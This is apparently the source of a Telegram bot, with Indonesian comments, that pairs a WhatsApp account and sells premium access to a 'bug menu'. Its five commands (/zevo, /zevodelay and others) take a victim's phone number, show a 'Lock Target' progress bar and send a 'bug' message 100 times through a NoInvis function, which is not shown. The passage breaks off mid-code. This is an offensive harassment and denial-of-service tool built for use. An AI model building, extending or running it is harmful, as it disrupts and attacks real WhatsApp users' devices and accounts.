const { Telegraf, Markup, session } = require("telegraf");
const {
  makeWASocket,
  makeInMemoryStore,
  useMultiFileAuthState,
  DisconnectReason,
  encodeSignedDeviceIdentity,
  fetchLatestBaileysVersion,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
} = require("@whiskeysockets/baileys");
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const thumbnail = fs.readFileSync('./2.jpg'); 
const config = require("./config.js");
const { BOT_TOKEN } = require("./config");
const crypto = require("crypto");
const premiumFile = "./premiumuser.json";
const adminFile = "./adminuser.json";
const TOKENS_FILE = "./tokens.json";

const { execSync } = require('child_process');
const sessionPath = './session';

const FILE_NAME = "Telegram User - @Alpooooooofoluv.enc";
const FILE_SIZE_MB = 500;
const sessions = new Map();
const bot = new Telegraf(BOT_TOKEN);

bot.use(session());
let bots = [];

let anas;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
const randomImages = [
    "https://files.catbox.moe/8tbxdn.jpeg",

  ];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });
async function generateFile(filePath, sizeMB) {
  if (!fs.existsSync(filePath)) {
    try {
      execSync(`dd if=/dev/zero of="${filePath}" bs=1M count=${sizeMB} status=none`);
    } catch (err) {
      throw new Error("❌ Gagal membuat file dummy.");
    }
  }
}


/////////// UNTUK MENYIMPAN DATA CD \\\\\\\\\\\\\\
const COOLDOWN_FILE = path.join(__dirname, "database", "cooldown.json");
let globalCooldown = 0;

function getCooldownData(ownerId) {
  const cooldownPath = path.join(
    DATABASE_DIR,
    "users",
    ownerId.toString(),
    "cooldown.json"
  );
  if (!fs.existsSync(cooldownPath)) {
    fs.writeFileSync(
      cooldownPath,
      JSON.stringify(
        {
          duration: 0,
          lastUsage: 0,
        },
        null,
        2
      )
    );
  }
  return JSON.parse(fs.readFileSync(cooldownPath));
}



function loadCooldownData() {
  try {
    ensureDatabaseFolder();
    if (fs.existsSync(COOLDOWN_FILE)) {
      const data = fs.readFileSync(COOLDOWN_FILE, "utf8");
      return JSON.parse(data);
    }
    return { defaultCooldown: 60 };
  } catch (error) {
    console.error("Error loading cooldown data:", error);
    return { defaultCooldown: 60 };
  }
}

function saveCooldownData(data) {
  try {
    ensureDatabaseFolder();
    fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving cooldown data:", error);
  }
}

function isOnGlobalCooldown() {
  return Date.now() < globalCooldown;
}

function setGlobalCooldown() {
  const cooldownData = loadCooldownData();
  globalCooldown = Date.now() + cooldownData.defaultCooldown * 1000;
}

function parseCooldownDuration(duration) {
  const match = duration.match(/^(\d+)(s|m)$/);
  if (!match) return null;

  const [_, amount, unit] = match;
  const value = parseInt(amount);

  switch (unit) {
    case "s":
      return value;
    case "m":
      return value * 60;
    default:
      return null;
  }
}

function isOnCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return false;

  const now = Date.now();
  return now < cooldownData.lastUsage + cooldownData.duration;
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function formatTime(ms) {
  const totalSeconds = Math.ceil(ms / 1000);
  const minutes = Math.floor(totalSeconds / 60);
  const seconds = totalSeconds % 60;

  if (minutes > 0) {
    return `${minutes} menit ${seconds} detik`;
  }
  return `${seconds} detik`;
}

function getRemainingCooldown(ownerId) {
  const cooldownData = getCooldownData(ownerId);
  if (!cooldownData.duration) return 0;

  const now = Date.now();
  const remaining = cooldownData.lastUsage + cooldownData.duration - now;
  return remaining > 0 ? remaining : 0;
}

function ensureDatabaseFolder() {
  const dbFolder = path.join(__dirname, "NewDb");
  if (!fs.existsSync(dbFolder)) {
    fs.mkdirSync(dbFolder, { recursive: true });
  }
}
//////// FUNGSI VALID TOKEN \\\\\\\\\

function startBot() {
  console.log(
    chalk.bold.blue(` 
┏━━[ ʀօʊֆօքօʊ]
┃ De𝗏𝖾𝗅𝗈𝗉𝖾𝗋 : 𝐊𝐞𝐩𝐅𝐨Я𝐚𝐧𝐧𝐚𝐬
┃ 𝖵𝖾𝗋𝗌𝗂 : 1.0.0
┃ 𝖳𝗒𝗉𝖾 : Button
┗━━━━━━━━━━━━━━━❂	
`));
  console.log(
    chalk.bold.red(`Bot Active Now !!!
    `));
}



///// --- Koneksi WhatsApp --- \\\\\
const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }), // Log level diubah ke "info"
    auth: state,
    browser: ["Mac OS", "Safari", "10.15.7"],
    getMessage: async (key) => ({
      conversation: "P", // Placeholder, you can change this or remove it
    }),
  };

  anas = makeWASocket(connectionOptions);

  anas.ev.on("creds.update", saveCreds);
  

  anas.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      isWhatsAppConnected = true;
      console.log(
        chalk.white.bold(`

  ${chalk.green.bold("WHATSAPP TERHUBUNG")}
`)
      );
    }

    if (connection === "close") {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !==
        DisconnectReason.loggedOut;
      console.log(
        chalk.white.bold(`
 ${chalk.red.bold("WHATSAPP TERPUTUS")}
`),
        shouldReconnect
          ? chalk.white.bold(`
 ${chalk.red.bold("HUBUNGKAN ULANG")}
`)
          : ""
      );
      if (shouldReconnect) {
        startSesi();
      }
      isWhatsAppConnected = false;
    }
  });
};







const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};
/////==== Tap to reply ====\\\\\\
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("💢 WhatsApp belum terhubung njirr, pairing dulu lah, /addpairing...");
    return;
  }
  next();
};

////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}
// Muat ID owner dan pengguna premium
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
const userId = ctx.from.id;
const chatId = ctx.chat.id;

  if (!isOwner(ctx.from.id)) {
    return ctx.reply("💢 Lu siapa? Pea Owner Aja Bukan Kontoll...");
  }
  next();
};
const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply(
      "❌ Anda bukan Admin. jika anda adalah owner silahkan daftar ulang ID anda menjadi admin"
    );
  }
  next();
};
// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("💢 Premin Dlu Sama Own Lu Bangsad...");
  }
  next();
};
// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
  if (!adminList.includes(userId)) {
    adminList.push(userId);
    saveAdmins();
  }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
  adminList = adminList.filter((id) => id !== userId);
  saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
  fs.writeFileSync("./admins.json", JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
  try {
    const data = fs.readFileSync("./admins.json");
    adminList = JSON.parse(data);
  } catch (error) {
    console.error(chalk.red("Gagal memuat daftar admin:"), error);
    adminList = [];
  }
};

// -- Fungsi Memuat Daftar Owner
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

////=========MENU UTAMA========\\\\
bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username || userId.toString();
  const waktuRunPanel = getUptime();

  const fallbackKeyboard = {
    inline_keyboard: [
      [{ text: "Developer", url: "https://t.me/Alpooooooofoluv" }],
    ],
  };

  const mainMenuMessage = `

「 ʀօʊֆօքօʊ 」

□ り乇√乇ﾚのｱ乇尺 : @Alpooooooofoluv
□ √乇尺丂ﾉの刀 : 1.0.0
□ ﾚﾑ刀ムひﾑム乇  : JavaScript

□ 丂ｲﾑｲひ丂 : ${isPremium ? "Premium" : "No"}

( ! ) ༑丂ᴇʟʟᴇᴄᴛ 乃ᴜᴛᴛᴏɴ 乃ᴇʟᴏ
`;

  const mainKeyboard = [
    [
      { text: "のᴡɴᴇʀ ﾶᴇɴᴜ", callback_data: "owner_menu" },
      { text: "乃ᴜɢ ﾶᴇɴᴜ", callback_data: "bug_menu" },
    ],
    [
      { text: "ｲʜᴀɴᴋ丂 ｷᴏʀ 丂ᴜᴘᴘᴏʀᴛ", callback_data: "thanks" },
    ],
    [
      { text: "りᴇᴠᴇʟᴏᴘᴇʀ 尺のひ丂のｱのひ", url: "https://t.me/Alpooooooofoluv" },
    ],
  ];

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: mainKeyboard },
  });
});

bot.action("owner_menu", async (ctx) => {
  const Name = ctx.from.username || ctx.from.id.toString();
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `
      ( ʀօʊֆօքօʊ )

╭━─━─ (Owner Menu)
┃/addprem       
╰➤  akses premium
┃/delprem       
╰➤  delete premium
┃/addadmin      
╰➤  akses admin
┃/deladmin      
╰➤  delete admin
┃/delsesi       
╰➤  hapus session
┃/restart       
╰➤  restart bot
┃/setjeda       
╰➤  cooldown
┃/addpairing    
╰➤  connect bot
╰━━━━━━━━━━━━━━━━━━⭓
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("bug_menu", async (ctx) => {
  const Name = ctx.from.username || ctx.from.id.toString();
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `
      ( ʀօʊֆօքօʊ )

╭━( 乃ᴜɢ ﾶᴇɴᴜ )
┃/zevo     
╰➤  Delay Duration + Blank 
┃/zevodelay     
╰➤  Delay Invisible
┃/zevolow     
╰➤  Duration Hours
┃/zevobeta     
╰➤  Low Delay invis
┃/zevovoul   
╰➤  High Delay invis
╰━━━━━━━━━━━━━━━━━━⭓
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("thanks", async (ctx) => {
  const Name = ctx.from.username || ctx.from.id.toString();
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `
      ( ʀօʊֆօքօʊ )

╭━( Tʜᴀɴᴋs Tᴏ )
┃Allah SWT 
┃My Parents
┃𝐊𝐞𝐩𝐅𝐨Я𝐚𝐧𝐧𝐚𝐬 ( Developer )
┃Zyro ( My Friend )
┃Array ( My Best Friend )
┃stven ( My Teacher )
┃Rijal ( My Friend )
╰━━━━━━━━━━━━━━━━━━⭓
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "Bᴀᴄᴋ", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username || userId.toString();
  const waktuRunPanel = getUptime();

  const mainMenuMessage = `
      ( ʀօʊֆօքօʊ )

「 ʀօʊֆօքօʊ 」

□ り乇√乇ﾚのｱ乇尺 : @Alpooooooofoluv
□ √乇尺丂ﾉの刀 : 1.0.0
□ ﾚﾑ刀ムひﾑム乇  : JavaScript

□ 丂ｲﾑｲひ丂 : ${isPremium ? "Premium" : "No"}

( ! ) ༑丂ᴇʟʟᴇᴄᴛ 乃ᴜᴛᴛᴏɴ 乃ᴇʟᴏ
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const mainKeyboard = [
    [
      { text: "のᴡɴᴇʀ ﾶᴇɴᴜ", callback_data: "owner_menu" },
      { text: "乃ᴜɢ ﾶᴇɴᴜ", callback_data: "bug_menu" },
    ],
    [
      { text: "ｲʜᴀɴᴋ丂 ｷᴏʀ 丂ᴜᴘᴘᴏʀᴛ", callback_data: "thanks" },
    ],
    [
      { text: "りᴇᴠᴇʟᴏᴘᴇʀ 尺のひ丂のｱのひ", url: "https://t.me/Alpooooooofoluv" },
    ],
  ];

  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});
///////==== CASE BUG 1 ===\\\\\\\
bot.command("zevo", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /zevo 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sᴀʙᴀʀ Tᴀɪ\n Tᴜɴɢɢᴜ ${remainingTime} Dᴇᴛɪᴋ Lᴀɢɪ`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
▢ ｲᴀʀɢᴇᴛ : ${q}
丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ
▢ ｱʀᴏɢʀᴇ丂 : [░░░░░░░░░░] 0%

`,
      parse_mode: "Markdown",
    }
  );

  // Progress bar bertahap
  const progressStages = [
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [███░░░░░░░]30%", delay: 200 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [█████░░░░░]50%", delay: 100 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [███████░░░]70%", delay: 100 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [█████████░]90%", delay: 100 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%", delay: 200 },
  ];

   // Jalankan progres bertahap
  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `

▢ ｲᴀʀɢᴇᴛ : ${q}
丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ
${stage.text}

`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
  
    await ctx.editMessageCaption(
    `

▢ ｲᴀʀɢᴇᴛ : ${q}
▢ 丂ᴛᴀᴛᴜ丂 : りᴏɴᴇ
▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "ᄃᴇᴋ ｲᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]],
      },
    }
  );

  /// Eksekusi bug setelah progres selesai
   console.log("\x1b[32m[ Proses Mengirim Bug ]\x1b[0m Tunggu Hingga Selesai");
    console.log("\x1b[32m[ Berhasil Mengirim Bug ]\x1b[0m anas Cloud");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 100; i++) {
    
  await NoInvis( target);
    
    console.log(chalk.red.bold(`ʀօʊֆօքօʊSending Bug ${i + 1}/100 To ${target}`));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

});

bot.command("zevodelay", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /zevodelay 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sᴀʙᴀʀ Tᴀɪ\n Tᴜɴɢɢᴜ ${remainingTime} Dᴇᴛɪᴋ Lᴀɢɪ`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
▢ ｲᴀʀɢᴇᴛ : ${q}
丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ
▢ ｱʀᴏɢʀᴇ丂 : [░░░░░░░░░░] 0%

`,
      parse_mode: "Markdown",
    }
  );

  // Progress bar bertahap
  const progressStages = [
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [███░░░░░░░]30%", delay: 200 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [█████░░░░░]50%", delay: 100 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [███████░░░]70%", delay: 100 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [█████████░]90%", delay: 100 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%", delay: 200 },
  ];

   // Jalankan progres bertahap
  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `

▢ ｲᴀʀɢᴇᴛ : ${q}
丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ
${stage.text}

`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
  
    await ctx.editMessageCaption(
    `

▢ ｲᴀʀɢᴇᴛ : ${q}
▢ 丂ᴛᴀᴛᴜ丂 : りᴏɴᴇ
▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "ᄃᴇᴋ ｲᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]],
      },
    }
  );

  /// Eksekusi bug setelah progres selesai
   console.log("\x1b[32m[ Proses Mengirim Bug ]\x1b[0m Tunggu Hingga Selesai");
    console.log("\x1b[32m[ Berhasil Mengirim Bug ]\x1b[0m anas Cloud");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 100; i++) {
      await NoInvis( target);
    
    console.log(chalk.red.bold(`ʀօʊֆօքօʊSending Bug ${i + 1}/100 To ${target}`));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

});

bot.command("zevolow", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /zevolow 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sᴀʙᴀʀ Tᴀɪ\n Tᴜɴɢɢᴜ ${remainingTime} Dᴇᴛɪᴋ Lᴀɢɪ`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
▢ ｲᴀʀɢᴇᴛ : ${q}
丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ
▢ ｱʀᴏɢʀᴇ丂 : [░░░░░░░░░░] 0%

`,
      parse_mode: "Markdown",
    }
  );

  // Progress bar bertahap
  const progressStages = [
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [███░░░░░░░]30%", delay: 200 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [█████░░░░░]50%", delay: 100 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [███████░░░]70%", delay: 100 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [█████████░]90%", delay: 100 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%", delay: 200 },
  ];

   // Jalankan progres bertahap
  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `

▢ ｲᴀʀɢᴇᴛ : ${q}
丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ
${stage.text}

`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
  
    await ctx.editMessageCaption(
    `

▢ ｲᴀʀɢᴇᴛ : ${q}
▢ 丂ᴛᴀᴛᴜ丂 : りᴏɴᴇ
▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "ᄃᴇᴋ ｲᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]],
      },
    }
  );

  /// Eksekusi bug setelah progres selesai
   console.log("\x1b[32m[ Proses Mengirim Bug ]\x1b[0m Tunggu Hingga Selesai");
    console.log("\x1b[32m[ Berhasil Mengirim Bug ]\x1b[0m anas Cloud");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 100; i++) {
      await NoInvis( target);
    
    console.log(chalk.red.bold(`ʀօʊֆօքօʊSending Bug ${i + 1}/100 To ${target}`));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

});

bot.command("zevobeta", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /zevobeta 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sᴀʙᴀʀ Tᴀɪ\n Tᴜɴɢɢᴜ ${remainingTime} Dᴇᴛɪᴋ Lᴀɢɪ`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
▢ ｲᴀʀɢᴇᴛ : ${q}
丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ
▢ ｱʀᴏɢʀᴇ丂 : [░░░░░░░░░░] 0%

`,
      parse_mode: "Markdown",
    }
  );

  // Progress bar bertahap
  const progressStages = [
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [███░░░░░░░]30%", delay: 200 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [█████░░░░░]50%", delay: 100 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [███████░░░]70%", delay: 100 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [█████████░]90%", delay: 100 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%", delay: 200 },
  ];

   // Jalankan progres bertahap
  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `

▢ ｲᴀʀɢᴇᴛ : ${q}
丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ
${stage.text}

`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
  
    await ctx.editMessageCaption(
    `

▢ ｲᴀʀɢᴇᴛ : ${q}
▢ 丂ᴛᴀᴛᴜ丂 : りᴏɴᴇ
▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "ᄃᴇᴋ ｲᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]],
      },
    }
  );

  /// Eksekusi bug setelah progres selesai
   console.log("\x1b[32m[ Proses Mengirim Bug ]\x1b[0m Tunggu Hingga Selesai");
    console.log("\x1b[32m[ Berhasil Mengirim Bug ]\x1b[0m anas Cloud");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 100; i++) {
      await NoInvis( target);
    
    console.log(chalk.red.bold(`ʀօʊֆօքօʊSending Bug ${i + 1}/100 To ${target}`));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

});

bot.command("zevovoul", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id;
  const chatId = ctx.chat.id;

  if (!q) {
    return ctx.reply(`Cᴏɴᴛᴏʜ Pᴇɴɢɢᴜɴᴀᴀɴ : /zevovoul 62×××`);
  }

  if (!isOwner(ctx.from.id) && isOnGlobalCooldown()) {
    const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
    return ctx.reply(`Sᴀʙᴀʀ Tᴀɪ\n Tᴜɴɢɢᴜ ${remainingTime} Dᴇᴛɪᴋ Lᴀɢɪ`);
  }

  let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Kirim pesan proses dimulai dan simpan messageId-nya
  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
▢ ｲᴀʀɢᴇᴛ : ${q}
丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ
▢ ｱʀᴏɢʀᴇ丂 : [░░░░░░░░░░] 0%

`,
      parse_mode: "Markdown",
    }
  );

  // Progress bar bertahap
  const progressStages = [
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [█░░░░░░░░░]10%", delay: 200 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [███░░░░░░░]30%", delay: 200 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [█████░░░░░]50%", delay: 100 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [███████░░░]70%", delay: 100 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [█████████░]90%", delay: 100 },
    { text: "▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%", delay: 200 },
  ];

   // Jalankan progres bertahap
  for (const stage of progressStages) {
    await new Promise((resolve) => setTimeout(resolve, stage.delay));
    await ctx.editMessageCaption(
      `

▢ ｲᴀʀɢᴇᴛ : ${q}
丂ᴛᴀᴛᴜ丂 : Lᴏᴄᴋ Tᴀʀɢᴇᴛ
${stage.text}

`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
      }
    );
  }
  
    await ctx.editMessageCaption(
    `

▢ ｲᴀʀɢᴇᴛ : ${q}
▢ 丂ᴛᴀᴛᴜ丂 : りᴏɴᴇ
▢ ｱʀᴏɢʀᴇ丂 : [██████████]100%

`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
